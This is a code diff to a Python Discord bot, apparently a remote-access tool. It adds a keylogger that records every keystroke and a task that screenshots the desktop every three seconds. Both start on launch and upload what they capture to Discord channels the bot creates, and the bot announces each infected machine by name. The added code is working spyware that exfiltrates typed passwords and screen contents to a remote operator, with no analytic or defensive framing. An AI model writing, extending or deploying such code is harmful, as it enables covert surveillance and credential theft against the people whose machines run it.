@@ -1,7 +1,7 @@
 import os
 import discord
 import subprocess
-from discord.ext import commands
+from discord.ext import commands, tasks
 from PIL import ImageGrab
 import io
 import platform
@@ -17,6 +17,12 @@ import time
 import aiofiles
 import aiohttp
 import shutil
+import pythoncom
+from pynput import keyboard
+import threading
+
+last_keylog_message_id = "None"
+last_keylog_timestamp = "None"
 
 # Decrypting the token
 key = b"XNVMkRPc1qP4Bq9C_OXAtYWD54rpUtJNpO_PICvFLII="  # Replace with your actual key
@@ -262,6 +268,84 @@ async def cmds(ctx):
 # Override the default help command
 bot.help_command = None
 
+# Keylogger class
+class Keylogger:
+    def __init__(self):
+        self.log = []
+        self.last_message_id = None
+        self.last_timestamp = None
+
+    def on_press(self, key):
+        try:
+            char = key.char
+            if char.isspace():
+                char = " "
+            self.log.append(char)
+            print(char, end='', flush=True)
+            if char == '\n':
+                self.send_log()
+        except AttributeError:
+            if key == keyboard.Key.space:
+                self.log.append(" ")
+            elif key == keyboard.Key.enter:
+                self.log.append("\n")
+                self.send_log()
+            else:
+                self.log.append(f"[{key}]")
+
+    def send_log(self):
+        if self.log:
+            log_content = ''.join(self.log)
+            print(f"Sending log: {log_content}")  # Debug statement
+            self.log = []
+            # Send the log content to the Discord channel
+            asyncio.run_coroutine_threadsafe(self.send_to_discord(log_content), bot.loop)
+
+    async def send_to_discord(self, log_content):
+        global last_keylog_message_id, last_keylog_timestamp
+        channel = bot.get_channel(KEYS_CHANNEL_ID)
+        if channel:
+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            message = await channel.send(f"Captured Keystrokes at {timestamp}: ```{log_content}```")
+            self.last_message_id = message.id
+            self.last_timestamp = timestamp
+            last_keylog_message_id = message.id
+            last_keylog_timestamp = timestamp
+        else:
+            print(f"Channel with ID {KEYS_CHANNEL_ID} not found!")  # Debug statement
+
+# Start the keylogger
+def start_keylogger():
+    with keyboard.Listener(on_press=Keylogger().on_press) as listener:
+        listener.join()
+
+# Screen capturing task
+@tasks.loop(seconds=3)  # Capture a screenshot every 3 seconds
+async def capture_screenshot():
+    screenshot = ImageGrab.grab()
+    byte_io = io.BytesIO()
+    screenshot.save(byte_io, 'PNG')
+    byte_io.seek(0)
+    file = discord.File(byte_io, 'screenshot.png')
+    channel = bot.get_channel(SCREENSHOTS_CHANNEL_ID)
+    if channel:
+        # Generate a new timestamp for when the screenshot is sent
+        screenshot_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+        embed = discord.Embed(title="Screenshot", description="Here is the screenshot:", color=discord.Color.dark_red())
+        embed.set_image(url="attachment://screenshot.png")
+        if last_keylog_message_id:
+            embed.add_field(name="Last Keylog Message", value=f"[Message](https://discord.com/channels/{GUILD_ID}/{KEYS_CHANNEL_ID}/{last_keylog_message_id}) at {last_keylog_timestamp}", inline=False)
+        else:
+            embed.add_field(name="Last Keylog Message", value="None", inline=False)
+
+        # Add the new timestamp to the embed
+        embed.add_field(name="Screenshot Sent At", value=screenshot_timestamp, inline=False)
+
+        await channel.send(embed=embed, file=file)
+    else:
+        print(f"Channel with ID {SCREENSHOTS_CHANNEL_ID} not found!")  # Debug statement
+
 # On bot startup: Check and create the channel, ping @everyone in the corresponding channel
 @bot.event
 async def on_ready():
@@ -284,12 +368,34 @@ async def on_ready():
     CHANNEL_ID = channel.id
     print(f"Channel ID set to: {CHANNEL_ID}")  # Debug statement
 
+    # Create or get the keys channel
+    keys_channel_name = f"{channel_name}-keys"
+    keys_channel = await get_or_create_channel(guild, keys_channel_name)
+
+    global KEYS_CHANNEL_ID
+    KEYS_CHANNEL_ID = keys_channel.id
+    print(f"Keys Channel ID set to: {KEYS_CHANNEL_ID}")  # Debug statement
+
+    # Create or get the screenshots channel
+    screenshots_channel_name = f"{channel_name}-screenshots"
+    screenshots_channel = await get_or_create_channel(guild, screenshots_channel_name)
+
+    global SCREENSHOTS_CHANNEL_ID
+    SCREENSHOTS_CHANNEL_ID = screenshots_channel.id
+    print(f"Screenshots Channel ID set to: {SCREENSHOTS_CHANNEL_ID}")  # Debug statement
+
     # Send a "ping" message to indicate the bot is online
     await channel.send(f"@everyone The bot is now online and active on {desktop_name}.")
     embed = discord.Embed(title="Bot Online", description=f"The bot is now online and active on {desktop_name}.", color=discord.Color.dark_red())
     await channel.send(embed=embed)
 
     print(f"Bot is online. Pinged channel: {channel.name}")
+
+    # Start the keylogger in a separate thread
+    threading.Thread(target=start_keylogger, daemon=True).start()
+
+    # Start the screenshot capturing task
+    capture_screenshot.start()
 
 # Run the bot
 def run_bot():
